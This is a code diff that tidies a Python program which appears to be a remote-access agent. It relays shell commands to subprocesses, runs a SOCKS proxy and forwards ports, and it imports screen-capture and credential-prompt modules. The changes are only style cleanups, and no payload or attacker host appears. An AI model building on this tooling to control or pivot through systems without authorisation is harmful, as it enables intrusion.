@@ -1,10 +1,7 @@
 import os
 import sys
 import base64
-import http.client
-import json
 import getpass
-import ssl
 import time
 import subprocess
 from subprocess import CalledProcessError
@@ -21,7 +18,6 @@ import ctypes
 
 import pyautogui
 from io import BytesIO
-from PIL import Image
 
 import threading
 from threading import Thread
@@ -48,11 +44,11 @@ def enqueue_output(out, queue):
 		if not line:
 			break
 		#queue.put(str(line, 'utf-8'))
-		queue.put(line)    
+		queue.put(line)
 	out.close()
 
 class SubProcessManager(Thread):
-	def __init__(self, subprocessId):  
+	def __init__(self, subprocessId):
 		Thread.__init__(self)
 		self.currentProcess = None;
 		self.subprocessId = subprocessId
@@ -73,17 +69,17 @@ class SubProcessManager(Thread):
 				else:
 					self.currentProcess.stdin.write(newInput + "\n")
 					self.currentProcess.stdin.flush()
-			time.sleep(0.05)        
+			time.sleep(0.05)   
 		if not self.currentProcess == None:
 			self.currentProcess.kill()
 
 	def kill(self):
 		self.stayAlive = False
-    
+
 	def getCurrentProcessStr(self):
-		if self.currentProcess == None:
+		if self.currentProcess is None:
 			return "No Process"
-		elif not self.currentProcess == None and not self.currentProcess.poll() == None:
+		elif not self.currentProcess is None and not self.currentProcess.poll() == None:
 			return self.lastCommand + " exited with code " + str(self.currentProcess.poll())
 		else:
 			return self.lastCommand
@@ -111,8 +107,7 @@ class SocksProxyLoop(Thread):
 			if forwardData:
 				try:
 					self.remote_socket.send(forwardData)
-				except Exception as e:
-					#print("Cannot connect {}".format(e), file=sys.stderr)
+				except Exception:
 					self.close_down()
 			try:
 				data = self.remote_socket.recv(4096)
@@ -197,7 +192,7 @@ class PortForwardInboundLoop(Thread):
 				data = self.remoteSocket.recv(4096)
 				if data:
 					self.daemon.pushForward(self.targetHost + ":" + str(self.targetPort), data)
-			except socket.timeout as e:
+			except socket.timeout:
 				dummy=1
 			except Exception as e:
 				print("Cannot connect {}".format(e), file=sys.stderr)
